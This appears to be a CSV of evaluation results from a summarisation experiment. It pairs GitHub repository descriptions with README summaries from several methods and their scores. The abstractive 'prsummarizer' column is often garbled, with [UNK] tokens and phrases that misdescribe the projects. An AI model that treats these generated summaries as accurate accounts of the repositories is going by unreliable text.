,id,link,summary,lex_rank,edmunson,lead_cm,prsummarizer,lead_cm score,prsummarizer score
43,136787313,https://api.github.com/repos/benji87/Lona,"A tool for defining design systems and using them to generate cross-platform UI code, Sketch files, and other artifacts.",lona studio is primarily for building component systems but can also be used for quickly mocking up new screens from existing components viewing designs with real data from json files or apis experimenting with designs across multiple screen sizes automating design tasks e.g. localizing screenshots for different languages and exporting hundreds of images working with animations lottie and rendering videos from them and more if you have xcode installed you can try it out by following the installation instructions.,lona developer preview this project is in an early stage and lacks documentation â€“ however with some effort it can be used very effectively.,lona developer preview this project is in an early stage and lacks documentation â€“ however with some effort it can be used very effectively. if,project for building design systems and using them to generate crossplatform,0.06060666666666668,0.4820166666666667
44,137318417,https://api.github.com/repos/DimitriF/teleport-vision-api,teleportHQ Vision API is a computer vision API specifically trained for detecting atomic UI elements in pictures of hand-drawn wireframes,default value is 0.1. the detection model outputs a confidence score for each detection between 0 and 1 and wont include in the response detections with confidence lower than this threshold.,vision api teleporthq vision api is a computer vision api specifically trained for detecting atomic ui elements in pictures of handdrawn wireframes as seen in the picture above.,vision api teleporthq vision api is a computer vision api specifically trained for detecting atomic ui elements in pictures of handdrawn wireframes as seen in,computer is a vision api specifically trained for detecting atomic ui elements in pictures of handdrawn,0.8083033333333333,0.7510933333333334
45,137043305,https://api.github.com/repos/bigant88/ImageGridView,Help you to create a flexible image grid easily.,use picasso glide just set a .,imagegridview help you to create a flexible image grid easily.,imagegridview help you to create a flexible image grid easily. 帮助你轻松的创建一个灵活的图片 grid 布局 中文说明（作者英文比较渣，建议国人直接阅读中文版） how to use first introduce the core library module to your,help you to create a flexible image grid,0.5710000000000001,0.9385633333333333
46,136817063,https://api.github.com/repos/kkalvagadda/cloudbreak,"A tool for provisioning and managing Apache Hadoop clusters in the cloud. Cloudbreak, as part of the Hortonworks Data Platform, makes it easy to provision, configure and elastically grow HDP clusters on cloud infrastructure. Cloudbreak can be used to prov",running the environment service in idea after importing the cloudbreak repo root launch the environment application by executing the com.sequenceiq.environment.environmentapplication class with the following jvm options dvault.root.token replace with the value of vaultroottoken from the cbdlocalprofile file.,cloudbreak website httpshortonworks.comopensourcecloudbreak documentation httpsdocs.hortonworks.comhdpdocumentscloudbreakcloudbreak2.7.0index.html local development setup as of now this document focuses on setting up your development environment on macos.,cloudbreak website httpshortonworks.comopensourcecloudbreak documentation httpsdocs.hortonworks.comhdpdocumentscloudbreakcloudbreak2.7.0index.html local development setup as of now this document focuses on setting up your development environment on macos. youll need homebrew,website to setup the working environment for your website rather to be a working with your local of [UNK],0.08450666666666666,0.11299333333333333
47,136652434,https://api.github.com/repos/manelmontilla/aloisius,A Python library to create/update/delete AWS CloudFormation stacks in parallel,it allows you to use outputs from one stack as input parameters to other stacks.,aloisius .. image httpsimg.shields.iopypivaloisius.svg target httpspypi.python.orgpypialoisius .. image httpstravisci.orgadonigaloisius.svgbranchmaster target httpstravisci.orgadonigaloisius .. image httpsimg.shields.iopypilaloisius.svg target httpsopensource.orglicensesbsd2clause about aloisius helps you to manage the lifecycle of aws cloudformation stacks.,aloisius .. image httpsimg.shields.iopypivaloisius.svg target httpspypi.python.orgpypialoisius .. image httpstravisci.orgadonigaloisius.svgbranchmaster target httpstravisci.orgadonigaloisius .. image httpsimg.shields.iopypilaloisius.svg target httpsopensource.orglicensesbsd2clause about aloisius helps you to manage the lifecycle of,python library to manage the lifecycle of aws cloudformation stacks,0.05796666666666666,0.4969666666666666
48,137230068,https://api.github.com/repos/5nafu/hetzner-kube,A CLI tool for provisioning kubernetes clusters on Hetzner Cloud,phases after a cluster is once created nodes creation is enough you can perform the steps from hetznerkube cluster create separately.,hetznerkube fast and easy setup of kubernetes clusters on hetzner cloud this project contains a cli tool to easily provision kubernetes clusters on hetzner cloud.,hetznerkube fast and easy setup of kubernetes clusters on hetzner cloud this project contains a cli tool to easily provision kubernetes clusters on hetzner cloud.,cli tool to provision kubernetes clusters,0.4842766666666667,0.5595233333333334
49,136722831,https://api.github.com/repos/cxm19881208/YYDispatchQueuePool,iOS utility class to manage global dispatch queue.,中文介绍 ios 全局并发队列管理工具。 该项目是 yykit 组件之一 当用 concurrent queue 来执行大量 block 时，有时会遇到下面这种情况： 当某个 block 所在线程被锁住时，concurrent queue 会创建大量线程以至于占用了过多资源而影响到主线程。这里可以用一个全局的 serial queue pool 来尽量控制全局线程数。 用法 安装 cocoapods 在 podfile 中添加 pod yydispatchqueuepool。 执行 pod install 或 pod update。 导入 。 carthage 在 cartfile 中添加 github ibiremeyydispatchqueuepool。 执行 carthage update platform ios 并将生成的 framework 添加到你的工程。 导入 。 手动安装 下载 yydispatchqueuepool 文件夹内的所有内容。 将 yydispatchqueuepool 内的源文件添加拖放到你的工程。 导入 yydispatchqueuepool.h。 文档 你可以在 cocoadocs 查看在线 api 文档，也可以用 appledoc 本地生成文档。 系统要求 该项目最低支持 ios 6.0 和 xcode 8.0。 许可证 yydispatchqueuepool 使用 mit 许可证，详情见 license 文件。 相关文章 ios 保持界面流畅的技巧,yydispatchqueuepool ios utility class to manage global dispatch queue.,yydispatchqueuepool ios utility class to manage global dispatch queue. its a component of yykit when use a concurrent queue to execute lots of blocks i,utility class to manage global dispatch,0.4737733333333334,0.8492066666666668
50,137424851,https://api.github.com/repos/cestebanez91/GCP-VPN-PANOS,This skillet will configure IKE/IPSec parameters and BGP in order to connect PAN-OS to GCP VPN Gateway.,purpose config detail description this skillet will be used to connect your palo alto network device physical or vmseries to any gcp vpn gateway to establish an ipsec connection.,gcpvgwpanos configure ikeipsec bgp for panos and connect to gcp vpn gateway brief description this skillet will configure ikeipsec parameters and bgp in order to connect panos to gcp vpn gateway.,gcpvgwpanos configure ikeipsec bgp for panos and connect to gcp vpn gateway brief description this skillet will configure ikeipsec parameters and bgp in order to,configure configure bgp for panos and connect to gcp vpn gateway,0.5533933333333333,0.40476
51,136624292,https://api.github.com/repos/laraquadan/apple-appstore-analysis,Jupyter notebook in python to analyse and model AppleAppStore Dataset,apple app store data analysis and modeling the project aims on helping app store developers to develop successful trending new apps.,apple app store data analysis and modeling the project aims on helping app store developers to develop successful trending new apps.,apple app store data analysis and modeling the project aims on helping app store developers to develop successful trending new apps. the project applies the,store data analysis and modeling the project aims on helping app store developers to develop successful about new apps,0.11544333333333336,0.13963333333333333
52,137043349,https://api.github.com/repos/edificewang/caffe-segnet-cudnn5,"This repository was a fork of BVLC/caffe and includes the upsample, bn, dense_image_data and softmax_with_loss (with class weighting) layers of caffe-segnet (https://github.com/alexgkendall/caffe-segnet) to run SegNet with cuDNN version 5.",caffe segnet cudnn5 this is a modified version of caffe which supports the segnet architecture as described in segnet a deep convolutional encoderdecoder architecture for image segmentation vijay badrinarayanan alex kendall and roberto cipolla httparxiv.orgabs1511.00561 please refer to alex kendalls caffesegnet for tutorial and a guide how to use it httpsgithub.comalexgkendallcaffesegnet.,caffe segnet cudnn5 this is a modified version of caffe which supports the segnet architecture as described in segnet a deep convolutional encoderdecoder architecture for image segmentation vijay badrinarayanan alex kendall and roberto cipolla httparxiv.orgabs1511.00561 please refer to alex kendalls caffesegnet for tutorial and a guide how to use it httpsgithub.comalexgkendallcaffesegnet.,caffe segnet cudnn5 this is a modified version of caffe which supports the segnet architecture as described in segnet a deep convolutional encoderdecoder architecture for,modified is a modified version of caffe how to convolutional the inference time,0.19552,0.13885666666666666
53,137584823,https://api.github.com/repos/moneybutton/paymail-client,Js client to interact with servers using paymail specification.,moneybuttonpaymailclient description javascript client to interact with bsv paymail protocol.,moneybuttonpaymailclient description javascript client to interact with bsv paymail protocol.,moneybuttonpaymailclient description javascript client to interact with bsv paymail protocol. ussage.,[UNK] client to interact with bsv,0.44444333333333336,0.5094
54,137018131,https://api.github.com/repos/DistantEye/PDF_Book,Configurable tabbed PDF viewer meant for managing a stack of open reference materials at once,ctrl will change the dpi image size on the selected tab.,pdfbook configurable tabbed pdf viewer meant for managing a stack of open reference materials at once.,pdfbook configurable tabbed pdf viewer meant for managing a stack of open reference materials at once. speed and memory use is not competitive with traditional,tabbed tabbed pdf viewer meant for managing a stack of open reference materials and memory use is not competitive is not [UNK],0.7456133333333334,0.6419566666666666
55,136962771,https://api.github.com/repos/stottle-uk/cra-ssr-ts-recipe,A recipe for using SSR and TypeScript with Isomorphic Create React App (CRA).,to access the development web server you can use port 3000. when you run yarn start a separate server is started that handles ssr and web api endpoints.,recipe for using create react app with ssr supporting react router and redux and typescript.,recipe for using create react app with ssr supporting react router and redux and typescript. this project is wip. this project was bootstrapped with create,recipe for using create react app with ssr application,0.4083833333333333,0.5575766666666667
56,136957290,https://api.github.com/repos/hlebowicz/NSGIF,???? iOS Library for converting videos to animated GIFs.,demo check out the demo project for a quick example of how nsgif works.,nsgif is an ios library for converting your videos into beautiful animated gifs.,nsgif is an ios library for converting your videos into beautiful animated gifs. check out this example. sometimes we need to deal with gifs in,an ios library for converting your videos into beautiful animated gifs,0.3890533333333333,0.6480899999999999
57,136781076,https://api.github.com/repos/arnav300/camunda-bpm-examples,A collection of usage examples for camunda BPM intended to get you started quickly,camunda bpm examples looking for the invoice example contained in the distribution you can find it here httpsgithub.comcamundacamundabpmplatformtreemasterexamplesinvoice camunda bpm examples is a collection of focused usage examples for the camunda bpm platform intended to get you started quickly.,camunda bpm examples looking for the invoice example contained in the distribution you can find it here httpsgithub.comcamundacamundabpmplatformtreemasterexamplesinvoice camunda bpm examples is a collection of focused usage examples for the camunda bpm platform intended to get you started quickly.,camunda bpm examples looking for the invoice example contained in the distribution you can find it here httpsgithub.comcamundacamundabpmplatformtreemasterexamplesinvoice camunda bpm examples is a collection of,[UNK] plugin to interact with the invoice container,0.25263,0.06060666666666667
58,137159383,https://api.github.com/repos/charan493/CodeWithDanDockerServices,Demonstration of using Docker to orchestrate multiple services,note you must have docker desktop for this particular demo to work or another local kubernetes option such as minikube.,docker services orchestration demonstration kubernetes orchestration demo also available this is a demo application from the docker for web developers course on pluralsight that demonstrates how multiple services can be integrated and orchestrated using docker and docker compose.,docker services orchestration demonstration kubernetes orchestration demo also available this is a demo application from the docker for web developers course on pluralsight that demonstrates,demo application from the docker for web developers course and orchestrated with docker,0.12120999999999998,0.12698666666666666
59,136983896,https://api.github.com/repos/aliciajin/darkflow,"Translate darknet to tensorflow. Load trained weights, retrain/fine-tune using tensorflow, export constant graph def to mobile devices",bash forward all images in sampleimg using tiny yolo and json output.,intro realtime object detection and classification.,intro realtime object detection and classification. paper version 1 version 2. read more about yolo in darknet and download weight files here. in case the,[UNK] files to detect and download files to a custom file,0.06060666666666668,0.08888666666666667
60,136689064,https://api.github.com/repos/parmarsumit/terraform-aws-nomad,A Terraform Module for how to run Nomad on AWS using Terraform and Packer,and instead of maintaining all that infrastructure code yourself you can leverage the work of the module community and maintainers and pick up infrastructure improvements through a version number bump.,nomad aws module this repo contains a set of modules in the modules folder for deploying a nomad cluster on aws using terraform.,nomad aws module this repo contains a set of modules in the modules folder for deploying a nomad cluster on aws using terraform. nomad is,set of modules in the modules to deploy a nomad cluster on aws on [UNK],0.32756,0.27756
61,136936681,https://api.github.com/repos/13-Graphics/anypixel,A web-friendly way for anyone to build unusual displays,getting started check out the examples weve included 12 example apps written by googlers and friends for the 8th avenue lobby display in nyc.,anypixel.js is an opensource software and hardware library that makes it possible to use the web to create big unusual interactive displays.,anypixel.js is an opensource software and hardware library that makes it possible to use the web to create big unusual interactive displays. anyone can fork,opensource software and hardware library that makes it possible to use the web to create big unusual interactive displays anyone can fork [UNK],0.16667,0.18181666666666665
62,137340347,https://api.github.com/repos/gopi-bathala/NetBillPaymentCalcService,This service is used for calculating the net bill amount by implementing certain discounts ,please copy the complete project available in github in d directory and execute below in browser to get code coverage statistics.,netbillpaymentcalcservice this service is used for calculating the net bill amount by implementing certain discounts reference documentation 1. executing the service please follow below steps for executing this project in windows operating system.,netbillpaymentcalcservice this service is used for calculating the net bill amount by implementing certain discounts reference documentation 1. executing the service please follow below steps,service is used for calculating the net bill amount by implementing certain discounts reference,0.71287,0.92674
63,137389385,https://api.github.com/repos/intepra/lasercut-box-openscad,OpenSCAD module for generating cutting plans for boxes,laser cut box openscad module this is an openscad module for creating boxes to be lasercut out of flat panels e.g. plywood or acrylic.,laser cut box openscad module this is an openscad module for creating boxes to be lasercut out of flat panels e.g. plywood or acrylic.,laser cut box openscad module this is an openscad module for creating boxes to be lasercut out of flat panels e.g. plywood or acrylic. the,openscad module for creating boxes to be lasercut out of flat panels [UNK] [UNK] or,0.21814,0.29538
64,136883628,https://api.github.com/repos/fengjixuchui/Melkor_ELF_Fuzzer,Melkor is a very intuitive and easy-to-use ELF file format fuzzer to find functional and security bugs in ELF parsers.,the string tables could be fuzzed as well z. its up to you to decide how badly you want to corrupt an elf once the orcs have been created inside the orcs dir its time to test them with the help of testfuzzed.sh where you can simply specify the name of the folder with the orcs to be run os loader testing or add an extra parameter to specify which program and its parameters youd like to test against every malformed elf within the orcs folder.,description melkor an elf file format fuzzer melkor a fictional character from j. r. r. tolkiens middleearth legendarium was the first dark lord and master of sauron.,description melkor an elf file format fuzzer melkor a fictional character from j. r. r. tolkiens middleearth legendarium was the first dark lord and master,an elf file format format to breed with a fictional character from j,0.22884,0.21183
65,136875904,https://api.github.com/repos/HBRambo/YYText,Powerful text framework for iOS to display and edit rich text.,把解析器添加到 yylabel 或 yytextview yylabel label ... label.textparser parser yytextview textview ... textview.textparser parser debug objc 设置一个全局的 debug option 来显示排版结果。 yytextdebugoption debugoptions yytextdebugoption new debugoptions.baselinecolor uicolor redcolor debugoptions.ctframebordercolor uicolor redcolor debugoptions.ctlinefillcolor uicolor colorwithred0.000 green0.463 blue1.000 alpha0.180 debugoptions.cgglyphbordercolor uicolor colorwithred1.000 green0.524 blue0.000 alpha0.200 yytextdebugoption setshareddebugoptiondebugoptions 更多示例 查看演示工程 demoyytextdemo.xcodeproj 安装 cocoapods 在 podfile 中添加 pod yytext。 执行 pod install 或 pod update。 导入 。 carthage 在 cartfile 中添加 github ibiremeyytext。 执行 carthage update platform ios 并将生成的 framework 添加到你的工程。 导入 。 手动安装 下载 yytext 文件夹内的所有内容。 将 yytext 内的源文件添加拖放到你的工程。 链接以下 frameworks uikit corefoundation coretext quartzcore accelerate mobilecoreservices 导入 yytext.h。 注意 你可以添加 yyimage 或 yywebimage 到你的工程，以支持动画格式gifapngwebp的图片。 文档 你可以在 cocoadocs 查看在线 api 文档，也可以用 appledoc 本地生成文档。 系统要求 该项目最低支持 ios 6.0 和 xcode 8.0。 已知问题 yytext 并不能支持所有 coretexttextkit 的属性，比如 nsbackgroundcolor、nsstrikethrough、nsunderline、nsattachment、nslink 等，但 yytext 中基本都有对应属性作为替代。详情见上方表格。 yytextview 未实现局部刷新，所以在输入和编辑大量的文本（比如超过大概五千个汉字、或大概一万个英文字符）时会出现较明显的卡顿现象。 竖排版时，添加 exclusionpaths 在少数情况下可能会导致文本显示空白。 当添加了非矩形的 textcontainerpath，并且有嵌入大于文本排版方向宽度的 rundelegate 时，rundelegate 之后的文字会无法显示。这是 coretext 的 bug（或者说是 feature）。 许可证 yytext 使用 mit 许可证，详情见 license 文件。,yytext powerful text framework for ios to display and edit rich text.,yytext powerful text framework for ios to display and edit rich text. its a component of yykit features uilabel and uitextview api compatible high performance,powerful text framework for ios and edit rich text,0.6034866666666666,0.85926
66,136604772,https://api.github.com/repos/Javier-Machin/tus-vimeo-upload,upload videos to vimeo using tus approach in React,your app is ready to be deployed see the section about deployment for more information.,this project was bootstrapped with create react app.,this project was bootstrapped with create react app. available scripts in the project directory you can run runs the app in the development mode. open,react app to reinforce react for the react,0.05882333333333334,0.15686
67,137268547,https://api.github.com/repos/Happy-Ferret/go-vdom-wasm,WASM VDOM to create frontend application using Go,govdomwasm this package allows to build frontend applications in go targeting webassembly.,govdomwasm this package allows to build frontend applications in go targeting webassembly.,govdomwasm this package allows to build frontend applications in go targeting webassembly. it provides a conveniant syntax close to the hyperscript one in the javascript,package allows to build frontend applications in go targeting,0.18312,0.35817000000000004
68,136763166,https://api.github.com/repos/fucora/php-sdk-binary-tools,Tool kit for building PHP under Windows,php sdk php sdk is a tool kit for windows php builds.,php sdk php sdk is a tool kit for windows php builds.,php sdk php sdk is a tool kit for windows php builds. license the php sdk itself and the sdk own tools and code are,[UNK] is a tool kit for interacting with the comment [UNK],0.27361,0.30555333333333334
69,136714201,https://api.github.com/repos/BioYLiu/MachineLearningStocks,Using python and scikit-learn to make stock predictions,this guide has been crossposted at my academic blog reasonabledeviations.science contents contents overview edit as of 24518 quickstart preliminaries historical data historical stock fundamentals historical price data creating the training dataset preprocessing historical price data features valuation measures financials trading information parsing backtesting current fundamental data stock prediction unit testing where to go from here data acquisition data preprocessing machine learning contributing overview the overall workflow to use machine learning to make stocks prediction is as follows acquire historical fundamental data – these are the features or predictors acquire historical stock price data – this is will make up the dependent variable or label what we are trying to predict.,machinelearningstocks in python a starter project and guide machinelearningstocks is designed to be an intuitive and highly extensible template project applying machine learning to making stock predictions.,machinelearningstocks in python a starter project and guide machinelearningstocks is designed to be an intuitive and highly extensible template project applying machine learning to making,starter project and guide machinelearningstocks is designed to be an intuitive and highly extensible template project to making stock predictions my hope is that applying project will help you understand the overall workflow to predict stock predictions and appreciate,0.23774666666666666,0.1823733333333333
70,136689477,https://api.github.com/repos/codyrutscher/x86-bare-metal-examples,Dozens of minimal operating systems to learn x86 system programming. Tested on Ubuntu 17.10 host in QEMU 2.10 and real hardware. Userland cheat at: https://github.com/cirosantilli/linux-kernel-module-cheat#userland-assembly ARM baremetal setup at: https:/,todo example.,x86 bare metal examples idprefix idseparator sectanchors sectlinks sectnumlevels 6 sectnums toc macro toclevels 6 toctitle dozens of minimal operating systems to learn x86 system programming.,x86 bare metal examples idprefix idseparator sectanchors sectlinks sectnumlevels 6 sectnums toc macro toclevels 6 toctitle dozens of minimal operating systems to learn x86 system,6 6 dozens of minimal operating systems to learn x86 system programming,0.2651533333333333,0.36921999999999994
71,136667077,https://api.github.com/repos/ziaridoy20/LearnDagger,List of Resources and links to learn Dagger 2,solid principles the definitive guide dependency injection and dagger basics what is dependency injection dagger 2 beginner tutorial youtube playlist one of the best tutorials explaining dependency injection and all the annotations involved with live examples from an android app from scratch.,list of resources to learn about dagger 2 why you need dependency injection d is for the dependency inversion principle all solid principles are essential in understanding in how to write better and maintanable code.,list of resources to learn about dagger 2 why you need dependency injection d is for the dependency inversion principle all solid principles are essential,list of resources to learn about dagger 2,0.35784666666666665,0.7267966666666666
72,136822414,https://api.github.com/repos/sgodoy17/java-placetopay,Library to connect with PlacetoPay Redirection service,placetopay redirection java library with this code you will be able to quickly connect with the placetopay redirection service.,placetopay redirection java library with this code you will be able to quickly connect with the placetopay redirection service.,placetopay redirection java library with this code you will be able to quickly connect with the placetopay redirection service. in order to see how it,java library with this code you to setup connect with the placetopay redirection,0.3583333333333333,0.4740733333333333
73,136962802,https://api.github.com/repos/AhmedAbdraboh/aws-account-automation,Tools to help automate your AWS Accounts,awsaccountautomation tools to automate your aws account deploybuckettemplate will create a bucket for lambda or other package deployments.,awsaccountautomation tools to automate your aws account deploybuckettemplate will create a bucket for lambda or other package deployments.,awsaccountautomation tools to automate your aws account deploybuckettemplate will create a bucket for lambda or other package deployments. it can be configured to allow access,tools to automate your aws account deploybuckettemplate will create a bucket for lambda or other package deployments,0.33889,0.45454666666666665
74,136940804,https://api.github.com/repos/drpicox/learn-react-redux-shoppingcart,A guided with tests example to learn react redux with custom hooks,note also that the expected code coverage of ducks is 100. solving the exercise step 2 react in this step you have to create the visual components and their connections to redux create the tests to verify that everything works create the application that works in the browser.,reactredux shopping cart exercise this repository is an exercise of a shopping cart.,reactredux shopping cart exercise this repository is an exercise of a shopping cart. it simulates a small catalog that is shown in the main view,this exercise of a shopping cart and provides a small cart to shows redux and a store state,0.03603333333333333,0.13333333333333333
75,137005983,https://api.github.com/repos/jothibasu-kamaraj/kubernetes-tests,A suite of tests to ensure Kubernetes has deployed properly,executing .runcontainerizedtests.sh t all with the config below in place would execute the two control tests against master and bastion instances in your deployment.,kubernetes testing this repository is the containerizeddeployable test suite that may be utilized to validate a kubernetes deployment.,kubernetes testing this repository is the containerizeddeployable test suite that may be utilized to validate a kubernetes deployment. this repo allows the execution of bats,test test test suite that may be utilized to validate a kubernetes deployment,0.17143,0.23188666666666666
76,137013618,https://api.github.com/repos/0xcod3/can-i-take-over-xyz,"\Can I take over XYZ?\"" — a list of services and how to claim (sub)domains with dangling DNS records.""",this project heavily relies on contributions from the public therefore proving that something is vulnerable is the security researcher and bug bounty programs sole discretion.,disclaimer warning the authors of this document take no responsibility for correctness.,disclaimer warning the authors of this document take no responsibility for correctness. this project is merely here to help guide security researchers towards determining whether,responsibility for the service that allows you to find security security towards determining,0.07575666666666668,0.08333333333333333
77,136621493,https://api.github.com/repos/ilavisharma/react-firebase-starter,"Boilerplate (seed) project for creating web apps with React.js, GraphQL.js and Relay",serverless edition react starter kit for firebase is a popular project template aka boilerplate for building modern scalable web applications with react relay and graphql using serverless infrastructure provided by google cloud cloud sql cloud functions cdn hosting and file storage.,react starter kit for firebase   a.k.a.,react starter kit for firebase a.k.a. serverless edition react starter kit for firebase is a popular project template aka boilerplate for building modern scalable web,starter kit for firebase aka serverless edition,0.13008333333333333,0.06349333333333333
78,137096503,https://api.github.com/repos/haim/WoeUSB, WoeUSB is a simple tool that enable you to create your own usb stick windows installer from an iso image or a real DVD. It is a fork of Congelli501's WinUSB.,official distribution packages fedora packages maintained by mprahl opensuse packages maintained by guoyunhe gentoo packages maintained by pacho thirdparty distribution packages arch linux packages maintained by darkfm ubuntu packages maintained by webupd8 build from source the following are the instructions to install woeusb if prebuilt version is not available or too old.,woeusb a linux program to create a windows usb stick installer from a real windows dvd or image.,woeusb a linux program to create a windows usb stick installer from a real windows dvd or image. this package contains two programs woeusb a,linux program to create a windows usb stick installer from a real windows dvd or image,0.3642733333333333,0.3635266666666667
79,137338531,https://api.github.com/repos/ericblade/ProjectExodus,Project Exodus - Unity to Unreal scene/project transfer tool.,whats supported and limitations the plugin will rebuild current scene or scenes will convert static meshes and will attempt to convert terrain landscapes and skeletal meshes to unreal format.,projectexodus currently supported versions currently supported versions are 2018.3 for unity and 4.22.1 for unreal 4 currently it is still possible to compile the plugin on 4.19.2. this file will be updated to indicate whne supported versions change.,projectexodus currently supported versions currently supported versions are 2018.3 for unity and 4.22.1 for unreal 4 currently it is still possible to compile the plugin,set of scripts to convert individual scenes and whole projects,0.09009,0.21052666666666667
80,136878844,https://api.github.com/repos/github-38438-org/vmdash,A Cloud (vm) Dashboard that allows you to interact with multiple providers from a single panel,vmdash a cloud vm dashboard that allows you to interact with multiple providers from a single panel.,vmdash a cloud vm dashboard that allows you to interact with multiple providers from a single panel.,vmdash a cloud vm dashboard that allows you to interact with multiple providers from a single panel. built on top of laradminator laravel adminator please,cloud vm dashboard that allows you to interact with multiple providers from a single panel built on top of laradminator,0.7767366666666667,0.8300633333333334
81,137053784,https://api.github.com/repos/greemxx/Android-GiphySearch,Super easy way to find awesome GIFs for your apps,giphy android search library this library is a wrapper giphys wonderful api and allows you to easily include animated gifs in your projects.,giphy android search library this library is a wrapper giphys wonderful api and allows you to easily include animated gifs in your projects.,giphy android search library this library is a wrapper giphys wonderful api and allows you to easily include animated gifs in your projects. the library,android library to interact with animated gifs,0.11428666666666665,0.15686
82,137395052,https://api.github.com/repos/oci-quickstart-forks/oci-quickstart-jenkins,Terraform module to deploy Jenkins on Oracle Cloud Infrastructure (OCI),example2 this example creates a vcn in oracle cloud infrastructure including default route table dhcp options security list and subnets from scratch then use terraformocijenkins module to deploy a jenkins cluster.,ociquickstartjenkins these are terraform modules that deploy jenkins on oracle cloud infrastructure oci.,ociquickstartjenkins these are terraform modules that deploy jenkins on oracle cloud infrastructure oci. about the jenkins oracle cloud infrastructure module provides a terraformbased jenkins cluster,module to deploy jenkins on oracle cloud infrastructure,0.4842766666666667,0.8842599999999999
83,137547198,https://api.github.com/repos/Oleiva/webmail-lite-8,Open-source webmail script for existing IMAP server,if youre looking for the latest code e.g. to contribute changes the following steps needs to be taken instead of unpacking the archive clone the repository into the installation directory change modules versions in file to devmaster adjust configuration file so that sources are preferred download from start the composer installation process by running the following from the command line nb it is strongly advised to run composer as nonroot user.,afterlogic webmail lite 8 opensource webmail script for your existing imap server.,afterlogic webmail lite 8 opensource webmail script for your existing imap server. for more information please visit webmail lite home page. you can check webmail,[UNK] is a simple script to enable your existing imap server,0.32845,0.35913666666666666
84,136600020,https://api.github.com/repos/BonnyHam/flat-surface-shader,"Flat Surface Shader for rendering lit triangles to a number of contexts including WebGL, Canvas 2D and SVG",calculation for every triangle in a scene the following calculation is performed a vector between the triangles centroid and the lights position is calculated and normalised.,flat surface shader fss simple lightweight flat surface shader written in javascript for rendering lit triangles to a number of contexts.,flat surface shader fss simple lightweight flat surface shader written in javascript for rendering lit triangles to a number of contexts. currently there is support,lightweight flat surface written in javascript for rendering lit triangles to a number of contexts,0.5346966666666666,0.6379900000000001
85,136809863,https://api.github.com/repos/ACPK/dms-in-rails,A document management system api that enables a user to manage docs.,document management system api document management system provides a restful api for users to create and manage documents giving different privileges based on user roles and managing authentication using jwt.,document management system api document management system provides a restful api for users to create and manage documents giving different privileges based on user roles and managing authentication using jwt.,document management system api document management system provides a restful api for users to create and manage documents giving different privileges based on user roles,[UNK] api for users to create and manage documents giving different privileges based on jwt roles,0.36448,0.2399266666666667
86,137475233,https://api.github.com/repos/jrhea/multistream-select,Friendly protocol multiplexing. It enables a multicodec to be negotiated between two entities.,a list message is simply so a remote side asking for a protocol listing would look like this for example example ls example in detail note each contains the size of the rest of the line including the newline bytes implementations jsmultistreamselect javascript implementation gomultistream go implementation mssnc multistreamselect netcat written in go maintainers captain diasdavid.,multistreamselect friendly protocol multiplexing.,multistreamselect friendly protocol multiplexing. it enables a multicodec to be negotiated between two entities. table of contents motivation protocol listing example ls example in detail,protocol protocol it enables a multicodec to be negotiated between two entities,0.6783633333333334,0.8475366666666666
87,137299962,https://api.github.com/repos/reitzmichnicht/bean-matchers,Hamcrest matchers for testing Java beans,any other properties on the bean are not tested.,bean matchers javabeans spec javabeans tutorial javabeans wikipedia entry project documentation google code project page archived beans are prevalent in our java world however these simple structures are commonly untested.,bean matchers javabeans spec javabeans tutorial javabeans wikipedia entry project documentation google code project page archived beans are prevalent in our java world however these,tutorial testing the hashcode way to consume the generated beans,0.10752666666666666,0.16666666666666666
88,137546640,https://api.github.com/repos/callmedba/RedisFullCheck,redis-full-check is used to compare whether two redis have the same data. redis-full-check用于比较2个redis数据是否一致。,redisfullcheck is used to compare whether two redis have the same data.,redisfullcheck is used to compare whether two redis have the same data.,redisfullcheck is used to compare whether two redis have the same data. we also offer a data synchronization tool called redisshake to syncing data from,used to generate data for the two data,0.4920633333333333,0.24889333333333333
89,137600416,https://api.github.com/repos/labcif/Base64SHA,Perl script to calculate and verify the SHA (256 or 512) hash values of files and prints them encoded in Base64 instead of hexadecimal.,b64sha is a perl script to calculate and compare the sha hash values 256 or 512 bits and print them encoded in base64 instead of hexadecimal.,b64sha is a perl script to calculate and compare the sha hash values 256 or 512 bits and print them encoded in base64 instead of hexadecimal.,b64sha is a perl script to calculate and compare the sha hash values 256 or 512 bits and print them encoded in base64 instead of,is a perl script to calculate and compare the sha hash values or [UNK],0.7297699999999999,0.44444333333333336
